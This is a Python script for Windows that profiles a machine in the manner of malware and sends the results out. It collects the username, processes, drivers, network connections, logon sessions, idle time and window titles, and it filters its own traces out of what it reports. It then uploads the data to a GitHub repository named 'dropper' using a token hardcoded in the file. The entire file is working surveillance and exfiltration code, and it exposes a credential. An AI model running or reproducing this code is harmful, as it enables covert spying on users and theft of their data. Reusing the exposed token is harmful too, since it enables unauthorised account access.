import os
import sys
import time
import socket
import struct
import platform
import ctypes
import json
import base64
import urllib.request
import urllib.error
import dataclasses
from datetime import datetime
from ctypes import wintypes

# ==============================
# Constants & Hardcoded Credentials
# ==============================
TCP_TABLE_OWNER_PID_ALL = 5
BASELINE_SNAPSHOTS = 3
BASELINE_WAIT = 5
TELEMETRY_SNAPSHOTS = 2
TELEMETRY_INTERVAL = 8
MAX_PATH = 260

# ⚠️ WARNING: Hardcoding tokens is a security risk. Rotate this token if this code is ever exposed.
GITHUB_TOKEN = "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"
GITHUB_OWNER = "albertwilliams2026"
GITHUB_REPO = "dropper"

# ==============================
# Data Structure
# ==============================
@dataclasses.dataclass
class Telemetry:
    username: str = ""
    hostname: str = ""
    os: str = ""
    time_of_day: str = ""
    day_of_week: str = ""
    working_hours: bool = False
    idle_seconds: int = 0
    active_window: str = ""
    process_list: list = dataclasses.field(default_factory=list)
    network_traffic: list = dataclasses.field(default_factory=list)
    drivers: list = dataclasses.field(default_factory=list)
    network_info: list = dataclasses.field(default_factory=list)
    usb_devices: list = dataclasses.field(default_factory=list)
    uptime_minutes: int = 0
    logon_sessions: list = dataclasses.field(default_factory=list)
    baseline_processes: list = dataclasses.field(default_factory=list)
    deviation_count: int = 0
    self_process: str = ""
    parent_process: str = ""

# ==============================
# Windows API Structures
# ==============================
class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.POINTER(wintypes.ULONG)),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", wintypes.LONG),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", wintypes.WCHAR * MAX_PATH)
    ]

class MIB_TCPROW_OWNER_PID(ctypes.Structure):
    _fields_ = [
        ("dwState", wintypes.DWORD),
        ("dwLocalAddr", wintypes.DWORD),
        ("dwLocalPort", wintypes.DWORD),
        ("dwRemoteAddr", wintypes.DWORD),
        ("dwRemotePort", wintypes.DWORD),
        ("dwOwningPid", wintypes.DWORD),
    ]

class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", wintypes.UINT), ("dwTime", wintypes.DWORD)]

class WTS_SESSION_INFO(ctypes.Structure):
    _fields_ = [
        ("SessionID", wintypes.DWORD),
        ("pWinStationName", wintypes.LPWSTR),
        ("State", wintypes.DWORD)
    ]

# ==============================
# Baseline + Telemetry Collection
# ==============================
def build_baseline(self_proc: str, parent_proc: str) -> list:
    freq = {}
    for _ in range(BASELINE_SNAPSHOTS):
        procs = get_processes()
        for p in procs:
            if p == self_proc or p == parent_proc:
                continue
            freq[p] = freq.get(p, 0) + 1
        time.sleep(BASELINE_WAIT)
    
    baseline = [proc for proc, count in freq.items() if count >= BASELINE_SNAPSHOTS - 1]
    return sorted(baseline)

def collect(baseline: list, self_proc: str, parent_proc: str) -> Telemetry:
    freq = {}
    for _ in range(TELEMETRY_SNAPSHOTS):
        procs = get_processes()
        for p in procs:
            freq[p] = freq.get(p, 0) + 1
        time.sleep(TELEMETRY_INTERVAL)
    
    current = []
    deviation = 0
    for proc, count in freq.items():
        if proc == self_proc or proc == parent_proc:
            continue
        if count >= TELEMETRY_SNAPSHOTS - 1:
            current.append(proc)
            if proc not in baseline:
                deviation += 1
    
    current = sorted(current)
    now = time.localtime()
    working = 9 <= now.tm_hour <= 17

    return Telemetry(
        username=os.environ.get("USERNAME", "Unknown"),
        hostname=socket.gethostname(),
        os=f"{sys.platform} {platform.machine()}",
        time_of_day=time.strftime("%H:%M:%S", now),
        day_of_week=time.strftime("%A", now),
        working_hours=working,
        idle_seconds=get_idle_seconds(),
        active_window=get_active_window_title(self_proc, parent_proc),
        process_list=current,
        drivers=get_drivers(),
        network_info=get_network_info(),
        network_traffic=get_network_traffic(),
        usb_devices=get_usb_devices(),
        uptime_minutes=get_uptime_minutes(),
        logon_sessions=get_logon_sessions(),
        baseline_processes=baseline,
        deviation_count=deviation,
        self_process=self_proc,
        parent_process=parent_proc
    )

def get_self_and_parent_names() -> tuple:
    pid = os.getpid()
    kernel32 = ctypes.windll.kernel32
    CreateToolhelp32Snapshot = kernel32.CreateToolhelp32Snapshot
    Process32FirstW = kernel32.Process32FirstW
    Process32NextW = kernel32.Process32NextW
    CloseHandle = kernel32.CloseHandle

    TH32CS_SNAPPROCESS = 0x00000002
    processes = {}

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == -1:
        return "", ""

    entry = PROCESSENTRY32W()
    entry.dwSize = ctypes.sizeof(PROCESSENTRY32W)

    if Process32FirstW(snap, ctypes.byref(entry)):
        while True:
            exe = entry.szExeFile.lower()
            processes[entry.th32ProcessID] = (exe, entry.th32ParentProcessID)
            if not Process32NextW(snap, ctypes.byref(entry)):
                break
    
    CloseHandle(snap)

    self_proc = ""
    parent_proc = ""
    if pid in processes:
        self_proc = processes[pid][0]
        ppid = processes[pid][1]
        if ppid in processes:
            parent_proc = processes[ppid][0]

    return self_proc, parent_proc

# ==============================
# Helpers 
# ==============================
def get_processes() -> list:
    processes = []
    kernel32 = ctypes.windll.kernel32
    CreateToolhelp32Snapshot = kernel32.CreateToolhelp32Snapshot
    Process32FirstW = kernel32.Process32FirstW
    Process32NextW = kernel32.Process32NextW
    CloseHandle = kernel32.CloseHandle

    TH32CS_SNAPPROCESS = 0x00000002

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == -1:
        return processes

    entry = PROCESSENTRY32W()
    entry.dwSize = ctypes.sizeof(PROCESSENTRY32W)

    if Process32FirstW(snap, ctypes.byref(entry)):
        while True:
            processes.append(entry.szExeFile.lower())
            if not Process32NextW(snap, ctypes.byref(entry)):
                break

    CloseHandle(snap)
    return processes

def get_drivers() -> list:
    drivers = []
    psapi = ctypes.windll.psapi
    EnumDeviceDrivers = psapi.EnumDeviceDrivers
    GetDeviceDriverBaseNameW = psapi.GetDeviceDriverBaseNameW

    cb_needed = wintypes.DWORD()
    EnumDeviceDrivers(None, 0, ctypes.byref(cb_needed))
    
    num_drivers = cb_needed.value // ctypes.sizeof(ctypes.c_void_p)
    DriversArray = ctypes.c_void_p * num_drivers
    drivers_array = DriversArray()
    
    if EnumDeviceDrivers(ctypes.byref(drivers_array), cb_needed, ctypes.byref(cb_needed)):
        for i in range(num_drivers):
            name_buf = ctypes.create_unicode_buffer(MAX_PATH)
            if GetDeviceDriverBaseNameW(drivers_array[i], ctypes.byref(name_buf), MAX_PATH):
                drivers.append(name_buf.value.lower())
    return drivers

def get_network_traffic() -> list:
    results = []
    iphlpapi = ctypes.windll.iphlpapi
    GetExtendedTcpTable = iphlpapi.GetExtendedTcpTable

    buf_size = wintypes.DWORD(0)
    GetExtendedTcpTable(None, ctypes.byref(buf_size), False, socket.AF_INET, TCP_TABLE_OWNER_PID_ALL, 0)

    buf = ctypes.create_string_buffer(buf_size.value)
    res = GetExtendedTcpTable(ctypes.byref(buf), ctypes.byref(buf_size), False, socket.AF_INET, TCP_TABLE_OWNER_PID_ALL, 0)
    if res != 0:
        return results

    num_entries = ctypes.cast(buf, ctypes.POINTER(wintypes.DWORD)).contents.value
    row_size = ctypes.sizeof(MIB_TCPROW_OWNER_PID)
    
    for i in range(num_entries):
        offset = 4 + (i * row_size)
        row = ctypes.cast(ctypes.byref(buf, offset), ctypes.POINTER(MIB_TCPROW_OWNER_PID)).contents
        
        local_port = socket.ntohs(row.dwLocalPort >> 16)
        remote_port = socket.ntohs(row.dwRemotePort >> 16)
        
        local_ip = socket.inet_ntoa(struct.pack('<I', row.dwLocalAddr))
        remote_ip = socket.inet_ntoa(struct.pack('<I', row.dwRemoteAddr))
        
        results.append(f"{local_ip}:{local_port} -> {remote_ip}:{remote_port} (PID {row.dwOwningPid}, State {row.dwState})")
        
    return results

def get_idle_seconds() -> int:
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    
    if user32.GetLastInputInfo(ctypes.byref(lii)):
        kernel32.GetTickCount.restype = wintypes.DWORD
        tick_count = kernel32.GetTickCount()
        return int((tick_count - lii.dwTime) / 1000)
    return 0

def get_active_window_title(self_proc: str, parent_proc: str) -> str:
    user32 = ctypes.windll.user32
    hwnd = user32.GetForegroundWindow()
    length = user32.GetWindowTextLengthW(hwnd) + 1
    buf = ctypes.create_unicode_buffer(length)
    user32.GetWindowTextW(hwnd, buf, length)
    
    title = buf.value
    title_lower = title.lower()
    
    if "command prompt" in title_lower or "powershell" in title_lower or self_proc in title_lower or parent_proc in title_lower:
        return "none"
    return title

def get_usb_devices() -> list:
    devices = []
    kernel32 = ctypes.windll.kernel32
    GetLogicalDriveStringsW = kernel32.GetLogicalDriveStringsW
    GetDriveTypeW = kernel32.GetDriveTypeW

    buf = ctypes.create_unicode_buffer(254)
    n = GetLogicalDriveStringsW(254, buf)
    if n == 0:
        return devices

    drives = buf.value.split('\x00')
    for drive in drives:
        if not drive:
            continue
        dtype = GetDriveTypeW(drive)
        if dtype == 2:
            devices.append(f"Removable: {drive}")
        elif dtype == 3:
            devices.append(f"Fixed: {drive}")
        elif dtype == 4:
            devices.append(f"Network: {drive}")
        elif dtype == 5:
            devices.append(f"CD-ROM: {drive}")
        elif dtype == 6:
            devices.append(f"RAM Disk: {drive}")
        else:
            devices.append(f"Unknown: {drive}")
    return devices

def get_network_info() -> list:
    info = []
    hostname = socket.gethostname()
    try:
        _, _, ip_list = socket.gethostbyname_ex(hostname)
        for ip in ip_list:
            info.append(f"Primary: {ip}")
    except socket.gaierror:
        info.append("Primary: Unknown")
    return info

def get_uptime_minutes() -> int:
    kernel32 = ctypes.windll.kernel32
    kernel32.GetTickCount64.restype = ctypes.c_ulonglong
    uptime_ms = kernel32.GetTickCount64()
    return int(uptime_ms / 1000 / 60)

def get_logon_sessions() -> list:
    sessions = []
    wtsapi32 = ctypes.windll.wtsapi32

    WTSEnumerateSessionsW = wtsapi32.WTSEnumerateSessionsW
    WTSQuerySessionInformationW = wtsapi32.WTSQuerySessionInformationW
    WTSFreeMemory = wtsapi32.WTSFreeMemory

    pp_session_info = ctypes.POINTER(wintypes.DWORD)()
    count = wintypes.DWORD()

    if WTSEnumerateSessionsW(0, 0, 1, ctypes.byref(pp_session_info), ctypes.byref(count)):
        entry_size = ctypes.sizeof(WTS_SESSION_INFO)
        for i in range(count.value):
            entry = ctypes.cast(
                ctypes.cast(pp_session_info, ctypes.c_void_p).value + (i * entry_size),
                ctypes.POINTER(WTS_SESSION_INFO)
            ).contents

            buffer = wintypes.LPWSTR()
            bytes_returned = wintypes.DWORD()

            if WTSQuerySessionInformationW(0, entry.SessionID, 5, ctypes.byref(buffer), ctypes.byref(bytes_returned)):
                if buffer.value:
                    sessions.append(f"Session {entry.SessionID}: {buffer.value}")
                WTSFreeMemory(buffer)
        
        WTSFreeMemory(pp_session_info)
    
    return sessions

# ==============================
# Direct Exfiltration Function
# ==============================
def exfiltrate_to_github(t: Telemetry):
    """Directly uploads telemetry to GitHub as all_telemetry_info.txt without saving locally."""
    github_path = "all_telemetry_info.txt"
    
    # 1. Convert Telemetry dataclass to JSON string
    telemetry_dict = dataclasses.asdict(t)
    json_data = json.dumps(telemetry_dict, indent=2)

    # 2. Prepare GitHub Upload Payload (requires Base64 encoding)
    encoded_content = base64.b64encode(json_data.encode("utf-8")).decode("utf-8")
    
    # 3. Check if file already exists to get its SHA (required for updates)
    url_api = f"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/contents/{github_path}"
    req_get = urllib.request.Request(
        url_api,
        headers={
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        },
        method="GET"
    )
    
    sha = None
    try:
        with urllib.request.urlopen(req_get) as response:
            if response.status == 200:
                file_info = json.loads(response.read().decode("utf-8"))
                sha = file_info.get("sha")
    except urllib.error.HTTPError as e:
        if e.code == 404:
            pass # File doesn't exist yet, which is fine for the first run
        else:
            print(f"[-] Error checking existing file: {e.code} - {e.read().decode('utf-8')}")
    except Exception as e:
        print(f"[-] Network error checking file: {e}")

    # 4. Prepare PUT request payload
    payload = {
        "message": f"Update telemetry data {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        "content": encoded_content
    }
    if sha:
        payload["sha"] = sha # Include SHA if we are overwriting an existing file

    req_put = urllib.request.Request(
        url_api,
        data=json.dumps(payload).encode("utf-8"),
        headers={
            "Authorization": f"token {GITHUB_TOKEN}",
            "Content-Type": "application/json",
            "Accept": "application/vnd.github.v3+json"
        },
        method="PUT"
    )

    # 5. Execute Upload/Update
    try:
        print(f"[*] Uploading telemetry directly to GitHub ({github_path})...")
        with urllib.request.urlopen(req_put) as response:
            if response.status in (200, 201):
                print("[+] Telemetry uploaded/updated on GitHub successfully.")
            else:
                print(f"[-] Unexpected GitHub API response: {response.status}")
    except urllib.error.HTTPError as e:
        error_body = e.read().decode('utf-8')
        print(f"[-] GitHub API HTTP Error: {e.code} - {error_body}")
    except Exception as e:
        print(f"[-] Failed to upload to GitHub: {e}")

# ==============================
# Example Usage
# ==============================
if __name__ == "__main__":
    self_p, parent_p = get_self_and_parent_names()
    print(f"[*] Self: {self_p}, Parent: {parent_p}")
    
    print("[*] Building baseline...")
    baseline = build_baseline(self_p, parent_p)
    
    print("[*] Collecting telemetry...")
    t = collect(baseline, self_p, parent_p)
    
    print("[*] Exfiltrating telemetry directly to GitHub...")
    exfiltrate_to_github(t)
